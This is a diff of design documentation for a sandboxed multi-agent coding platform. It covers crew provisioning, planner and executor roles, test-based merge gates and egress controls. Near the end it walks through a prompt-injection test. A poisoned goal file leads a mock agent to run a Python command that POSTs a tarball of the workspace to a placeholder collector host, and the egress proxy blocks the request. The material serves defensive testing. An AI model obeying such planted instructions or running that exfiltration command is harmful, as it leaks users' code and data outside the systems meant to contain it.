@@ -618,12 +618,15 @@ dispatches the **PM**. The PM reads the goal, files a ticket through
 > anything is created. `tests/e2e_kind/test_injected_conductor.py` runs
 > exactly that attack.
 
-**Fulfilment.** The implement workflow consumes the recorded request —
-fulfilment never improvises authority; without a recorded, unexpired request
-it refuses. It binds identities for the crew (deterministically from
-`{crew, member, run}`, so a retry after a crash lands on the same row rather
-than leaking a second identity), provisions each member its own pod with its
-own per-run ServiceAccount, and provisions **one sandbox** for the run.
+**Fulfilment.** The implement workflow records a crew request under its
+conductor's authority and consumes it — the recording must win the same
+compiled `crew.request` decision an intake-time request does, and without a
+recorded, unexpired request fulfilment refuses; authority is never
+improvised. It provisions **one sandbox** for the run, then binds
+identities for the crew (deterministically from `{crew, member, run}`, so a
+retry after a crash lands on the same row rather than leaking a second
+identity) and provisions each member its own pod with its own per-run
+ServiceAccount.
 
 > How does the code get in? Via `repo.archive`, the platform-only sixteenth
 > tool: the *gateway* clones the target repository with its own token,
@@ -632,16 +635,16 @@ own per-run ServiceAccount, and provisions **one sandbox** for the run.
 > configured and no credential anywhere in it. There is nothing to steal
 > and nowhere to push.
 
-**Planning.** The planner is dispatched first, on its own pod — the
-cheapest pod there is, since the planner is LLM-only and needs no sandbox
-wiring. It calls the gateway under its own projected token, so its
+**Planning.** The planner is dispatched first, on its own pod, with no
+sandbox of its own (`needs_sandbox: false`). It surveys the run's shared
+sandbox through the gateway, under its own projected token, so its
 read-only compiled scope is what policy enforces. It produces a task brief.
 
 **Implementation.** The executor is dispatched with that brief. It reads,
 writes and runs commands in the sandbox — all through the gateway, all
 policy-checked, all audited. Then it says it is done.
 
-> Its claim is **advisory**. Nothing depends on it.
+> Its claim of success is **advisory**. Nothing that ships depends on it.
 
 **The verify gate.** The orchestrator runs the sandbox's test suite *itself*,
 under its own platform identity. This is the gate of record. If it is red,
@@ -667,9 +670,10 @@ agent supplied *content*; every action with authority behind it happened
 inside the trusted gateway.
 
 **Review.** A review run provisions a fresh sandbox from the PR's head ref
-and dispatches an ephemeral reviewer — read-and-judge only, no write tools —
-which runs the tests, posts findings, and ends with a structured pass/fail
-verdict the platform journals.
+and dispatches an ephemeral reviewer — it can read the code and run it, but
+holds no tool that writes to the repository — which runs the tests, posts
+findings, and ends with a structured pass/fail verdict the platform
+journals.
 
 **The split oracle.** There is a subtlety the merge gate has to answer, and
 it is not about the code — it is about the *rubric*. If green tests are what
@@ -679,14 +683,16 @@ level up. A blueprint that declares `policies.contract_tests` splits the
 tree: a contract/acceptance tree (e.g. `tests/contract/`) that only a
 `contract-author` role may `git.open_pr` into — the implementer's attempt
 dies at the gateway with `git_open_pr_contract_tree` named in the audit row,
-the same positional refusal a `pm` PRing `tests/` gets — versus everything
-else under `tests/`, which is ordinary unit-test code the implementer still
+as positional as the default deny a `pm` calling `git.open_pr` at all
+earns — versus everything else under `tests/`, which is ordinary
+unit-test code the implementer still
 owns end to end. The PM sequences the phases (write the contract, then
 implement against it) by filing an ordered pair of tickets to two different
 crews; humans declare the paths and the owning role in the document, and the
-compiler enforces both. And because the contract tree joins the merge
-carve-out, an oracle edit can never ride the delegation it certifies — a
-contract PR always parks on a human, exactly like a `.github/` change.
+compiler enforces both. And because the contract tree can never be
+delegated, an oracle edit can never ride the delegation it certifies — a
+contract PR always parks on a human, the same landing a `.github/` change
+gets.
 
 **The merge gate.** The blueprint names the gate's resolver, and this is
 where quality becomes something policy owns rather than a human eyeballs.
@@ -748,15 +754,19 @@ in-class passing work with no further command.
 
 <br>
 
-Take the injected task in `examples/task-injected.md`: the payload tells the
-executor to publish the workspace to an outside collector. The mock brain
-obeys it credulously — deliberately, because the test is about the platform,
-not the model.
+Take the poisoned goal in `examples/goal-injected-conductor.md`: alongside
+telling the PM to spawn the forbidden `data-export` crew (denied at intake,
+above), its payload instructs the delivery crew to publish a snapshot of
+the repository to `https://collector.control9931.example` before touching
+any code. The mock brain obeys credulously — deliberately, because the test
+is about the platform, not the model.
 
 ```python
-# what the agent runs, via sandbox.exec
-python -c "import urllib.request, tarfile, io; ...
-           urllib.request.urlopen('https://collector.example.net/upload', data)"
+# what the agent runs, via sandbox.exec — a tar.gz of the workspace, POSTed out
+python -c "import io, tarfile, urllib.request; ...
+           urllib.request.urlopen(Request(
+               'https://collector.control9931.example/snapshot',
+               data=buf.getvalue(), method='POST'))"
 ```
 
 1. `sandbox.exec` **is** in the executor's compiled scope, so the gateway
@@ -764,15 +774,18 @@ python -c "import urllib.request, tarfile, io; ...
 2. The sandbox has no DNS and no direct route out. The request goes to the
    egress proxy because the proxy env is the only thing configured.
 3. The proxy resolves the run to its company's allowlist —
-   `pypi.org`, `files.pythonhosted.org` — and `collector.example.net` is not
-   on it. **403**, and an audit event with `source=sandbox-infra`,
+   `pypi.org`, `files.pythonhosted.org` — and `collector.control9931.example`
+   is not on it. **403**, and an audit event with `source=sandbox-infra`,
    `rule=egress_not_allowlisted`, correlated by `run_id`.
 4. Had the payload tried to bypass the proxy with a raw socket,
    NetworkPolicy would have dropped it silently. That layer is the backstop,
    not the alarm.
 
-The agent is told the request failed. It carries on with the real task. The
-attempt is on the record, attributable to one run and one participant.
+The agent is told the request failed. It carries on with the real task —
+the run still delivers its honest work on a feature branch. The attempt is
+on the record, correlated by `run_id` to the very `sandbox.exec` call the
+gateway allowed; `tests/e2e_kind/test_injected_conductor.py` asserts that
+whole arc, one query at a time.
 
 Note carefully what did *not* stop the attack: the model's judgement, the
 prompt, and the tool allow-list. The egress layer did. That is the design
